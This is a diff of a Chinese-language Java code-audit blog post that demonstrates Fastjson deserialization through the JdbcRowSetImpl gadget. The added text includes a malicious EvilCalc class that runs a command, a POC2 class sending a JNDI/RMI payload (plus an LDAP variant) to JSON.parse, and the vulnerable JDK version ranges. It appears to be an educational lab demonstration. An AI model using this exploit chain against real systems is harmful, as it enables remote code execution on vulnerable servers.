@@ -25,8 +25,10 @@
 <meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220719104047252.png">
 <meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220719105553466.png">
 <meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220719110049062.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220722163238090.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220722163354026.png">
 <meta property="article:published_time" content="2022-07-18T03:08:57.000Z">
-<meta property="article:modified_time" content="2022-07-20T02:14:49.598Z">
+<meta property="article:modified_time" content="2022-07-22T08:34:10.707Z">
 <meta property="article:author" content="Solkatt">
 <meta property="article:tag" content="java代码审计">
 <meta name="twitter:card" content="summary">
@@ -277,7 +279,7 @@
 <h2 id="基于JdbcRowSetImpl"><a href="#基于JdbcRowSetImpl" class="headerlink" title="基于JdbcRowSetImpl"></a>基于JdbcRowSetImpl</h2><p>基于JdbcRowSetImpl的利用链主要利用方式有JNDI+RMI和JNDI+LDAP。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基于RMI利用的JDK版本 ≤ 6u141、7u131、8u121</span><br><span class="line">基于LDAP利用的JDK版本 ≤ 6u211、7u201、8u191。</span><br></pre></td></tr></table></figure>
 
-<p>所有这里直接安装了jdk1.8.0_66。</p>
+<p>所有这里直接安装了jdk1.8.0_101。</p>
 <p>构造poc：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line"><span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/EvilCalc&quot;</span>,</span><br><span class="line"><span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -292,6 +294,14 @@
 <p>编写恶意类EvilCalc：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilCalc</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">EvilCalc</span><span class="params">()</span><span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            EvilCalc evilCalc = <span class="keyword">new</span> EvilCalc();</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>将其编译为.class文件。启动web服务，将恶意文件存放至本地。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220722163238090.png" alt="image-20220722163238090"></p>
+<p>之后运行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/EvilCalc\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/EvilCalc\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span></span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就可以弹出计算器了。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220722163354026.png" alt="image-20220722163354026"></p>
+<p>同样也可以使用LDAP来弹出该计算器。</p>
 
       
 
@@ -374,6 +384,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2022/07/22/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          log4j漏洞分析
+        
+      </div>
+    </a>
   
   
     <a href="/2022/07/14/java%E7%B1%BB%E5%AD%97%E8%8A%82%E7%A0%81%E4%B8%8E%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" id="article-nav-older" class="article-nav-link-wrap">
